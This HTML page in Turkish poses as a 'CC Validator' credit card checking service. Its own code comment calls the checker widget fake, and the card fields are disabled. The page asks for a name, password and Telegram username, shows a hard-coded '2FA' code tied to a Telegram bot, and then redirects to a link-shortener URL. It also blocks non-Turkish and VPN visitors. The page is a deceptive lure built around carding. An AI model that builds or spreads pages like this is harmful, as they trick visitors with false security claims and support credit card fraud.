<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>CC Checker | Doğrulama Sistemi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0a0e1a 0%, #0f1117 100%);
            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
        }

        .particle {
            position: fixed;
            width: 4px;
            height: 4px;
            background: rgba(79, 158, 255, 0.3);
            border-radius: 50%;
            pointer-events: none;
            animation: float 8s infinite ease-in-out;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px) translateX(0px); opacity: 0.3; }
            50% { transform: translateY(-50px) translateX(30px); opacity: 0.8; }
        }

        .container {
            max-width: 500px;
            width: 100%;
            position: relative;
            z-index: 10;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
            animation: fadeInDown 0.8s ease;
        }

        .logo {
            font-size: 42px;
            font-weight: 800;
            background: linear-gradient(135deg, #c0e0ff, #4f9eff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -1px;
            margin-bottom: 8px;
        }

        .badge {
            display: inline-block;
            background: rgba(79, 158, 255, 0.12);
            padding: 6px 14px;
            border-radius: 40px;
            font-size: 11px;
            color: #4f9eff;
            border: 1px solid rgba(79, 158, 255, 0.3);
        }

        @keyframes fadeInDown {
            from { opacity: 0; transform: translateY(-30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .card {
            background: rgba(22, 28, 44, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 32px;
            border: 1px solid rgba(42, 52, 72, 0.6);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            animation: fadeInUp 0.8s ease;
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .fake-checker {
            background: rgba(15, 22, 34, 0.6);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 24px;
            border: 1px solid #253450;
        }

        .fake-title {
            display: flex;
            justify-content: space-between;
            margin-bottom: 16px;
            padding-bottom: 12px;
            border-bottom: 1px solid #253450;
        }

        .fake-title span:first-child {
            font-weight: 600;
            color: #e2e8f0;
        }

        .fake-title span:last-child {
            font-size: 11px;
            color: #2dd4bf;
        }

        .input-row {
            display: flex;
            gap: 12px;
            margin-bottom: 16px;
        }

        .input-row input {
            flex: 1;
            background: #0f1622;
            border: 1px solid #2b354c;
            padding: 12px;
            border-radius: 16px;
            color: #f0f3fa;
            font-size: 13px;
        }

        .fake-btn {
            background: linear-gradient(105deg, #1f6392, #2a75a8);
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 24px;
            color: white;
            font-weight: 600;
            cursor: not-allowed;
            opacity: 0.6;
        }

        .auth-area {
            margin-top: 24px;
            padding-top: 24px;
            border-top: 1px solid #253450;
        }

        .input-group {
            margin-bottom: 18px;
        }

        label {
            display: block;
            font-size: 12px;
            font-weight: 500;
            color: #9aa5c0;
            margin-bottom: 6px;
        }

        input {
            width: 100%;
            background: #0f1622;
            border: 1px solid #2b354c;
            padding: 14px 18px;
            border-radius: 24px;
            font-size: 14px;
            color: #f0f3fa;
            outline: none;
            transition: 0.2s;
        }

        input:focus {
            border-color: #4f9eff;
            box-shadow: 0 0 0 3px rgba(79, 158, 255, 0.1);
        }

        button {
            background: linear-gradient(105deg, #1f6392, #2a75a8);
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 40px;
            font-weight: 600;
            font-size: 15px;
            color: white;
            margin-top: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        button:hover {
            transform: scale(0.98);
        }

        .info-box {
            background: rgba(16, 22, 36, 0.8);
            padding: 14px;
            border-radius: 20px;
            margin-bottom: 20px;
            font-size: 12px;
            text-align: center;
            color: #b9c7db;
            border: 1px solid #253450;
        }

        .bot-link {
            display: inline-block;
            background: #2a75a8;
            color: white;
            text-decoration: none;
            padding: 12px 24px;
            border-radius: 40px;
            font-size: 14px;
            font-weight: 600;
            margin-top: 12px;
            transition: 0.2s;
        }

        .bot-link:hover {
            background: #3a85b8;
        }

        .error-msg {
            font-size: 12px;
            margin-top: 10px;
            text-align: center;
            color: #f97316;
        }

        .success-msg {
            font-size: 12px;
            margin-top: 10px;
            text-align: center;
            color: #2dd4bf;
        }

        .loading-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.6s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .footer {
            text-align: center;
            margin-top: 24px;
            font-size: 10px;
            color: #4a5a7a;
        }

        .live-badge {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(45, 212, 191, 0.1);
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 10px;
            color: #2dd4bf;
            border: 1px solid rgba(45, 212, 191, 0.2);
            backdrop-filter: blur(4px);
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>

<script>
    for (let i = 0; i < 30; i++) {
        let particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.left = Math.random() * 100 + '%';
        particle.style.top = Math.random() * 100 + '%';
        particle.style.animationDelay = Math.random() * 8 + 's';
        document.body.appendChild(particle);
    }
</script>

<div class="container">
    <div class="header">
        <div class="logo">⚡ CC VALIDATOR</div>
        <div class="badge">● SECURE CONNECTION ● LIVE</div>
    </div>

    <div class="card">
        <!-- Sahte CC Checker -->
        <div class="fake-checker">
            <div class="fake-title">
                <span>💳 Kart Doğrulama</span>
                <span>🟢 AKTİF</span>
            </div>
            <div class="input-row">
                <input type="text" placeholder="4242 4242 4242 4242" disabled>
            </div>
            <div class="input-row">
                <input type="text" placeholder="12/28" disabled>
                <input type="text" placeholder="123" disabled>
            </div>
            <button class="fake-btn" disabled>🔍 Kart Doğrula</button>
            <div style="font-size: 11px; color: #5b6e8c; text-align: center; margin-top: 12px;">
                🔐 Sistem erişimi için giriş yapın
            </div>
        </div>

        <!-- Kayıt/Giriş Alanı -->
        <div class="auth-area">
            <div class="info-box">
                🚀 2FA DOĞRULAMA ZORUNLUDUR<br>
                Her kullanıcıya özel kod verilir
            </div>

            <div class="input-group">
                <label>👤 Ad Soyad</label>
                <input type="text" id="fullname" placeholder="Ad Soyad">
            </div>
            <div class="input-group">
                <label>🔐 Şifre</label>
                <input type="password" id="password" placeholder="••••••">
            </div>
            <div class="input-group">
                <label>📱 Telegram Kullanıcı Adı</label>
                <input type="text" id="telegramUser" placeholder="@kullaniciadi">
            </div>

            <button id="sendCodeBtn">📲 Özel Kodumu Al</button>
            <div id="loginError" class="error-msg"></div>

            <div id="verifyArea" style="display: none; margin-top: 20px;">
                <div class="info-box" id="verifyInfo">
                    🤖 <a href="https://t.me/ZazaChecker2fa_bot" target="_blank" id="botLinkBtn" style="color:#4f9eff; text-decoration:none">@ZazaChecker2fa_bot</a>'a /start gönderin<br>
                    <span style="font-size: 20px; font-weight: bold; display: block; margin: 10px 0;">⬇️</span>
                    Size özel kodunuz <strong style="color:#2dd4bf; font-size: 24px;">385217</strong> olarak verilecek
                </div>
                <div class="input-group">
                    <label>🔢 2FA Kodu</label>
                    <input type="text" id="verifyCode" placeholder="385217" maxlength="6">
                </div>
                <button id="doVerifyBtn">✅ Doğrula ve Giriş Yap</button>
                <div id="verifyMsg" class="error-msg"></div>
            </div>
        </div>
    </div>
    <div class="footer">
        🔒 256-bit SSL · TLS 1.3
    </div>
</div>
<div class="live-badge">🟢 SİSTEM AKTİF</div>

<script>
    const VERIFY_CODE = "385217";
    const BOT_LINK = "https://t.me/ZazaChecker2fa_bot";

    let pendingName = "", pendingPass = "", pendingTg = "";

    document.getElementById("sendCodeBtn").onclick = () => {
        const name = document.getElementById("fullname").value.trim();
        const pass = document.getElementById("password").value;
        const tg = document.getElementById("telegramUser").value.trim();
        const msgDiv = document.getElementById("loginError");

        if (!name || !pass || !tg) {
            msgDiv.innerText = "❌ Tüm alanları doldurun";
            return;
        }
        if (!tg.startsWith("@")) {
            msgDiv.innerText = "❌ Telegram kullanıcı adı @ ile başlamalı";
            return;
        }
        if (pass.length < 4) {
            msgDiv.innerText = "❌ Şifre en az 4 karakter olmalı";
            return;
        }

        pendingName = name;
        pendingPass = pass;
        pendingTg = tg;

        msgDiv.innerHTML = "⏳ <span class='loading-spinner'></span> Özel kod hazırlanıyor...";

        setTimeout(() => {
            msgDiv.innerHTML = "";
            document.getElementById("verifyArea").style.display = "block";
            document.getElementById("verifyInfo").innerHTML = `
                🤖 <a href="${BOT_LINK}" target="_blank" style="color:#4f9eff">@ZazaChecker2fa_bot</a>'a /start gönderin<br>
                <span style="font-size: 20px;">⬇️</span><br>
                <span style="font-size: 13px;">Size özel kod:</span><br>
                <span style="font-size: 32px; font-weight: bold; color: #2dd4bf; display: block; margin: 10px 0;">${VERIFY_CODE}</span>
            `;
        }, 800);
    };

    document.getElementById("doVerifyBtn").onclick = () => {
        const code = document.getElementById("verifyCode").value.trim();
        const msgDiv = document.getElementById("verifyMsg");

        if (!code) {
            msgDiv.innerText = "❌ Kodu girin";
            return;
        }

        msgDiv.innerHTML = "<span class='loading-spinner'></span> Doğrulanıyor...";

        setTimeout(() => {
            if (code === VERIFY_CODE) {
                msgDiv.style.color = "#2dd4bf";
                msgDiv.innerHTML = "✅ GİRİŞ BAŞARILI!";

                const successDiv = document.createElement('div');
                successDiv.style.cssText = "text-align:center; margin-top:16px; padding:16px; background:rgba(45,212,191,0.15); border-radius:20px;";
                successDiv.innerHTML = `
                    <span style="font-size:40px;">✅</span><br>
                    <strong style="color:#2dd4bf">HOŞ GELDİNİZ ${pendingName}!</strong><br>
                    <span style="font-size:12px;">Kart doğrulama sistemine yönlendiriliyorsunuz...</span>
                `;
                document.querySelector(".auth-area").appendChild(successDiv);

                setTimeout(() => {
                    window.location.href = "https://2no.co/VisualbasicChat";
                }, 2000);
            } else {
                msgDiv.style.color = "#f97316";
                msgDiv.innerHTML = "❌ Hatalı kod! Bot'dan doğru kodu alın.";
            }
        }, 800);
    };

    // IP kontrolü
    fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
        if (data.country_code !== "TR" || data.proxy || data.hosting || data.tor) {
            document.body.innerHTML = `<div style="text-align:center;padding:80px;background:#0a0e1a;color:white;min-height:100vh"><h1 style="color:#f97316">🌍 Erişim Engellendi</h1><p>Sadece Türkiye, VPN/Proxy yasak</p><p>IP: ${data.ip}</p></div>`;
        }
    }).catch(() => {});
</script>
</body>
</html>
